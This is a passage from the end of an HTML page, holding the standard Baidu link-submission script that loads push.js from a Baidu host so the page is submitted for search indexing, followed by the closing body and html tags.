    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
